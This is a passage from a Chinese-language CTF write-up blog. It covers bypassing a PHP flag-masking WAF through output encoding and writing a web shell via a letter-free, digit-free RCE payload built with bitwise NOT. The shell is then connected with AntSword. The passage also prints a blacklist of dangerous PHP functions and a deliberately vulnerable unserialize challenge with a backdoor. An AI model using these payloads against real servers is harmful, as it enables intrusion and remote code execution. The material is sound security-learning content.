class="hljs-string">&quot;[0-9a-zA-Z/+]+#&quot;</span>,<br>            <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$fakeflag</span>),<span class="hljs-variable">$buffer</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实和fileterOriginFlag()的作用差不多，但是多了一些截取base64编码中非”&#x3D;&#x3D;”和”&#x3D;”的部分的步骤。总体的意思也是将base64形式的flag替换成假的flag。</p><p>接下来看看这两个函数在waf中的位置，单独查函数名查不到，查filterFunc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheCtrl</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span></span>) </span>&#123;<span class="hljs-comment">#line180</span><br>    <span class="hljs-comment">//filter output</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]));<span class="hljs-comment">#chdir()改变当前目录，dirname()返回绝对路径，$_SERVER[&#x27;SCRIPT_FILENAME&#x27;]为当前执行脚本的绝对路径。(https://www.php.net/manual/zh/reserved.variables.server.php)</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-variable">$uniqid</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">uniqid</span>();<span class="hljs-comment">#uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。</span><br>    <span class="hljs-variable">$fakeflag</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>].<span class="hljs-string">&quot;&#123;<span class="hljs-subst">&#123;$uniqid&#125;</span>&#125;&quot;</span>;<br>    <span class="hljs-variable">$flagFormat</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;filterFunc&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>        <span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span>);<br>    &#125;<span class="hljs-comment">#依次执行那两个过滤函数</span><br></code></pre></td></tr></table></figure><p>然后看下这个cacheCtrl()在waf中的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;cacheCtrl&quot;</span>);<span class="hljs-comment">#line88</span><br></code></pre></td></tr></table></figure><p>去学习了下php中的<a href="https://www.php.net/manual/zh/function.ob-start.php">ob_start()</a>：</p><p>ob_start — 打开输出控制缓冲</p><p>ob_start(callable $callback)，内部缓冲区的内容可以用 <a href="https://www.php.net/manual/zh/function.ob-get-contents.php">ob_get_contents()</a> 复制到字符串变量中。想要输出存储在内部缓冲区中的内容，使用 <a href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> 函数。另外，使用 <a href="https://www.php.net/manual/zh/function.ob-end-clean.php">ob_end_clean()</a> 函数会静默丢弃掉缓冲区的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wiki">警告<br>当有正在调用的回调函数时，一些 Web 服务器（例如 Apache）会改变脚本的工作目录。可以在回调函数中再把它改回来，例如 chdir(dirname($_SERVER[&#x27;SCRIPT_FILENAME&#x27;]))。#也就是line182<br></code></pre></td></tr></table></figure><p>参数：</p><p>$callback：</p><p>可选参数 <code>callback</code> 函数可以被指定。此函数把一个字符串当作参数并返回一个字符串。当输出缓冲区被（<a href="https://www.php.net/manual/zh/function.ob-flush.php">ob_flush()</a>、<a href="https://www.php.net/manual/zh/function.ob-clean.php">ob_clean()</a> 或者相似的函数）冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。当调用 <code>callback</code> 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。如果这个 <code>callback</code> 不是一个可以调用的函数，此函数会返回 **<code>false</code>**。如果 <code>callback</code> 返回 <strong><code>false</code></strong> ，其原来的输入内容被直接送到浏览器。这个参数 <code>callback</code> 可以通过直接给一个 <strong><code>null</code></strong> 值而避开。</p><p>buffer：</p><p>输出缓冲区中的内容。</p><p>以下为用户自定义回调函数的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>function callback($buffer)#不理解上面ob_start(&quot;cacheCtrl&quot;)的可以结合这个看下，cacheCtrl的参数buffer和callback的参数buffer<br>&#123;<br>  // replace all the apples with oranges<br>  return (str_replace(&quot;apples&quot;, &quot;oranges&quot;, $buffer));<br>&#125;<br><br>ob_start(&quot;callback&quot;);<br><br>?&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>&lt;p&gt;It&#x27;s like comparing apples to oranges.&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;?php<br><br>ob_end_flush();<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>会输出</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>It&#x27;s like comparing oranges to oranges.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>“当调用 <code>callback</code> 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器”</p><p>也就是说，本题原本的$buffer为真正的flag，但是经过filterFunc的洗礼之后变成了fakeflag，调用cacheCtrl之后替换掉了原先位于缓冲区的真正的flag，将被送到浏览器。</p><p><a href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> - 冲刷出（送出）输出缓冲区内容并关闭缓冲区：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">#line92</span><br>     @<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>最终fakeflag从缓冲区被推向浏览器显示出来。</p><p>输出fakeflag的机制弄清楚了，根据<code>fileterOriginFlag()</code>的内容，原先buffer中的”ROIS{.*}”会被替换掉，那么只要我的输出中不包含这样的结构不就可以了吗。改变结构的想法无非就是编码、逆序。这里查看最上面的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<br></code></pre></td></tr></table></figure><p>发现base64编码被ban，逆序函数<code>strrev()</code>也被ban，<code>md5()</code>是没被ban但是总没有人敢手撕那坨玩意吧（</p><p><code>urlencode()</code>没被ban，已知flag中包含”{}”，url编码之后大括号形式改变。</p><p><img src="/2023/02/10/ROIS/image-20230409020606351.png"></p><p>url解码得到真正的flag。<code>bin2hex()</code>函数也没被ban，能将结果变为16进制。</p><p><img src="/2023/02/10/ROIS/image-20230409020801312.png"></p><p>hex解码后得到真正的flag。</p><p>那么如果不从浏览器中显示，而是直接读取文件呢？这样一来就不会有通过浏览器将fakeflag显示出来了，即使缓冲区被修改了也不会通过浏览器被读取因为是直接读取文件。没错也就是上马实现rce后用蚁剑连接。</p><p>但是在层层的过滤之下怎么getshell呢？这时候就要有请无数字字母rce了</p><p>学习了<a href="http://arsenetang.com/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">这篇文章</a>，用了大佬的无字母数字rce：</p><p><img src="/2023/02/10/ROIS/image-20230409154816719.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CB%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure><p>自己动手操作一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;file_put_contents&quot;</span>;<br><span class="hljs-variable">$b</span>=~<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;233.php&quot;</span>;<br><span class="hljs-variable">$c</span>=~<span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>;<br><span class="hljs-variable">$d</span>=~<span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-comment">#output:</span><br><span class="hljs-comment">#%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C</span><br><span class="hljs-comment">#%CD%CC%CC%D1%8F%97%8F</span><br><span class="hljs-comment">#%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4</span><br></code></pre></td></tr></table></figure><p>因此rce应为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CD%CC%CC%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure><p>cmd传入：</p><p><img src="/2023/02/10/ROIS/image-20230409161554426.png"></p><p>发现已经写入当前目录了(如果没有写入说明当前目录对用户没开放写入权限，就要写入&#x2F;tmp目录)</p><p><img src="/2023/02/10/ROIS/image-20230409161615101.png"></p><p>木马上完了，打开蚁剑，测试连接，连接成功。</p><p><img src="/2023/02/10/ROIS/image-20230409161705804.png"></p><p>读取根目录下的flag：</p><p><img src="/2023/02/10/ROIS/image-20230409161802859.png"></p><p>附：</p><ol><li><p>缓冲(buffer)与缓存(cache)：</p><ul><li><p>缓冲：为提高内存硬盘或其他I&#x2F;O设备之间数据交换的效率而设计，当创建一个buffer对象时，会先创建一个缓冲区数组，然后我们读一个文件时，会先从硬盘中读到缓冲区，待缓冲区满了再进行传送（比如要使用echo输出，会将输出先存入缓存区中）。</p></li><li><p>缓存：为提高cpu和内存之间的数据交换效率而设计。当计算机执行程序时，数据与地址管理部件会 预测 可能要用到的数据和指令, 并将这些数据和指令预先从内存中读出送到Cache. 一旦需要时，先检查Cache，若有就从Cache中读取，若无再访问内存。</p></li><li><p>buffer侧重写，cache侧重读。</p></li><li><p>举例：</p></li><li><p>buffer：倒垃圾不会一有垃圾就直接跑去垃圾站倒，而是先把垃圾扔垃圾桶里，等垃圾桶满了再去垃圾场倒。垃圾桶就是这个缓冲容器。</p></li><li><p>cache：缓存视频。</p></li><li><p>php中的输出流程：</p><p>php输出语句&#x2F;函数-&gt;php缓冲区配置-&gt;web服务器缓冲区配置-&gt;浏览器缓冲区-&gt;浏览器显示</p></li><li><p>php常用函数：</p><ul><li><p>获取buffer中的内容：<code>ob_get_contents()</code>，使用案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;log.txt&#x27;</span>,<span class="hljs-variable">$buffer</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#浏览器中显示&quot;hello world&quot;，log.txt中写入&quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>清空buffer：<code>ob_clean()</code>，使用案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;log.txt&#x27;</span>,<span class="hljs-variable">$buffer</span>);<br><span class="hljs-title function_ invoke__">ob_clean</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#浏览器中不显示&quot;hello world&quot;，而log.txt储存了&quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>ob_get_length()   - 返回输出缓冲区的长度</p></li><li><p>ob_get_level()    - 返回输出缓冲区的嵌套级别</p></li><li><p>ob_get_status()   - 返回输出缓冲区的状态（数组形式返回，默认返回最顶层，参数为true时返回所有）</p></li><li><p>ob_end_clean()    - 清空（擦除）缓冲区并关闭输出缓冲</p></li><li><p>ob_get_flush()     - 以字符串返回输出缓冲区内容并关闭缓冲</p></li><li><p>ob_end_flush()    - 冲刷出（送出）输出缓冲区内容缓冲并关闭输出缓冲</p></li></ul></li></ul></li><li><p>php ob_start()中的一个小小思考：</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-title function_ invoke__">ob_start</span>();              <span class="hljs-comment">// start output buffer 1</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span>;                <span class="hljs-comment">// fill ob1</span><br>        <br>        <span class="hljs-title function_ invoke__">ob_start</span>();              <span class="hljs-comment">// start output buffer 2</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;b&quot;</span>;                <span class="hljs-comment">// fill ob2</span><br>        <span class="hljs-variable">$s1</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); <span class="hljs-comment">// read ob2 (&quot;b&quot;)</span><br>        <span class="hljs-title function_ invoke__">ob_end_flush</span>();          <span class="hljs-comment">// flush ob2 to ob1</span><br>        <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;c&quot;</span>;                <span class="hljs-comment">// continue filling ob1</span><br>    <span class="hljs-variable">$s2</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); <span class="hljs-comment">// read ob1 (&quot;a&quot; . &quot;b&quot; . &quot;c&quot;)</span><br>    <span class="hljs-title function_ invoke__">ob_end_flush</span>();          <span class="hljs-comment">// flush ob1 to browser</span><br>    <br>    <span class="hljs-comment">// echoes &quot;b&quot; followed by &quot;abc&quot;, as supposed to:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;HR&gt;<span class="hljs-subst">$s1</span>&lt;HR&gt;<span class="hljs-subst">$s2</span>&lt;HR&gt;&quot;</span>;<br>    <br><span class="hljs-meta">?&gt;</span><br>    <br> <span class="hljs-comment">#输出</span><br></code></pre></td></tr></table></figure><p>3.php中系统命令执行函数：</p><table><thead><tr><th>函数</th><th>作用</th><th>使用</th></tr></thead><tbody><tr><td>system()</td><td>执行系统命令，输出执行结果</td><td>system(“ls”)</td></tr><tr><td>exec()</td><td>执行系统命令，不输出执行结果，返回执行结果数组</td><td>exec(‘ls’,$result)</td></tr><tr><td>passthru()</td><td>执行系统命令，输出执行结果(支持二进制)</td><td>passthru(“ls”)</td></tr><tr><td>shell_exec()</td><td>执行系统命令，不输出结果，返回执行结果字符串</td><td>shell_exec(“ls”)</td></tr><tr><td>popen</td><td>执行系统命令，不输出结果，返回一个资源类型</td><td>popen(“ls”,’r’)</td></tr><tr><td>&#96;&#96;</td><td>执行系统命令，不输出结果，返回执行结果字符串</td><td><code>ls</code></td></tr></tbody></table><p>4.无数字字母rce相关文章：</p><ul><li><a href="https://blog.csdn.net/qq_61955196/article/details/127932968">ctfshow大挑战rce篇</a></li><li><a href="http://arsenetang.com/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">Arsene.Tang的RCE篇之无数字字母rce</a></li><li><a href="https://potatowo233.github.io/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/">Potat0w0的（</a></li></ul><hr><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题综合性比较强，考察了挺多方面的东西的（大哭</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;left = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;right = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;:)&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pipimi::<span class="hljs-title function_ invoke__">__destruct</span>() =&gt; popko::<span class="hljs-title function_ invoke__">__call</span>() =&gt; <span class="hljs-title function_ invoke__">backdoor</span>()<br></code></pre></td></tr></table></figure><p>再看__call()方法下的规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ 